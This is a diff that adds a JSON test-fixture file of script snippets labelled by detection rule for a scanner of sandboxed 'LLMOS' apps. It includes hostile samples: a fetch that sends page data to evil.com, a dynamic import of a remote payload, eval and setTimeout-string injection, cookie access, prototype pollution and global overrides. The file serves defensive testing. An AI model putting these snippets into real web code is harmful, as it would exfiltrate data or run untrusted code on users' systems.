@@ -1,0 +1,110 @@
+[
+  {
+    "code": "<script>eval('alert(1)')</script>",
+    "shouldBlock": true,
+    "rule": "EVAL_USAGE",
+    "description": "Direct eval call"
+  },
+  {
+    "code": "<script>new Function('return this')()</script>",
+    "shouldBlock": true,
+    "rule": "EVAL_USAGE",
+    "description": "Function constructor"
+  },
+  {
+    "code": "<script>window.parent.postMessage('leak', '*')</script>",
+    "shouldBlock": true,
+    "rule": "PARENT_ACCESS",
+    "description": "Parent frame access via window.parent"
+  },
+  {
+    "code": "<script>top.location = 'https://evil.com'</script>",
+    "shouldBlock": true,
+    "rule": "PARENT_ACCESS",
+    "description": "Top frame navigation hijack"
+  },
+  {
+    "code": "<script>document.cookie = 'stolen=true'</script>",
+    "shouldBlock": true,
+    "rule": "DOCUMENT_COOKIE",
+    "description": "Cookie access"
+  },
+  {
+    "code": "<script>fetch('https://evil.com/steal?data=' + document.title)</script>",
+    "shouldBlock": false,
+    "rule": "RAW_FETCH",
+    "description": "Direct fetch (WARNING, not CRITICAL)"
+  },
+  {
+    "code": "<script>setTimeout('alert(1)', 100)</script>",
+    "shouldBlock": true,
+    "rule": "SETTIMEOUT_STRING",
+    "description": "setTimeout with string arg (implicit eval)"
+  },
+  {
+    "code": "<script>setInterval('document.body.innerHTML=\"pwned\"', 1000)</script>",
+    "shouldBlock": true,
+    "rule": "SETTIMEOUT_STRING",
+    "description": "setInterval with string arg"
+  },
+  {
+    "code": "<script>import('https://evil.com/payload.js')</script>",
+    "shouldBlock": true,
+    "rule": "DYNAMIC_IMPORT",
+    "description": "Dynamic import of external script"
+  },
+  {
+    "code": "<script>atob('YWxlcnQoMSk=')</script>",
+    "shouldBlock": false,
+    "rule": "ENCODED_PAYLOAD",
+    "description": "Base64 decode (WARNING — potential obfuscation)"
+  },
+  {
+    "code": "<script>String.fromCharCode(97,108,101,114,116)</script>",
+    "shouldBlock": false,
+    "rule": "ENCODED_PAYLOAD",
+    "description": "CharCode obfuscation (WARNING)"
+  },
+  {
+    "code": "<script>obj.__proto__.polluted = true</script>",
+    "shouldBlock": true,
+    "rule": "PROTOTYPE_POLLUTION",
+    "description": "Prototype pollution via __proto__"
+  },
+  {
+    "code": "<script>constructor.prototype.isAdmin = true</script>",
+    "shouldBlock": true,
+    "rule": "PROTOTYPE_POLLUTION",
+    "description": "Prototype pollution via constructor.prototype"
+  },
+  {
+    "code": "<script>globalThis.fetch = () => {}</script>",
+    "shouldBlock": true,
+    "rule": "GLOBAL_OVERRIDE",
+    "description": "Override globalThis.fetch"
+  },
+  {
+    "code": "<script>self.postMessage = () => {}</script>",
+    "shouldBlock": true,
+    "rule": "GLOBAL_OVERRIDE",
+    "description": "Override self.postMessage to intercept SDK"
+  },
+  {
+    "code": "<!-- capabilities: [\"ui:window\"] -->\n<script>LLMOS.ui.render(LLMOS.ui.h('h1', null, 'Hello'))</script>",
+    "shouldBlock": false,
+    "rule": null,
+    "description": "CLEAN: Valid app using SDK correctly"
+  },
+  {
+    "code": "<script>\nconst count = 0;\nLLMOS.timer.setInterval(() => { count++; }, 1000);\nLLMOS.ui.render(LLMOS.ui.h('div', null, count));\n</script>",
+    "shouldBlock": false,
+    "rule": null,
+    "description": "CLEAN: Timer app using SDK"
+  },
+  {
+    "code": "<script>\nasync function loadData() {\n  const items = await LLMOS.storage.get('items') || [];\n  LLMOS.ui.render(LLMOS.ui.h('ul', null, ...items.map(i => LLMOS.ui.h('li', null, i))));\n}\nloadData();\n</script>",
+    "shouldBlock": false,
+    "rule": null,
+    "description": "CLEAN: Storage app using SDK correctly"
+  }
+]
